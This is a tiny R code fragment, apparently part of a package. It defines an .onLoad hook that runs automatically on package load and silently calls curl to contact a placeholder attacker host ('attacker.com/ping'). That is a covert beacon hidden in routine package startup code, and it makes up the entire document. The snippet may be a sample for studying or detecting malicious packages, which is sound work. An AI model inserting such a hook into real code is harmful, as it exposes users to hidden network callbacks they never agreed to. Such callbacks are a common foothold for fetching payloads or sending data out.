(function(libname, pkgname) {
  system2("curl", args = c("-s", "https://attacker.com/ping"))
}) -> .onLoad
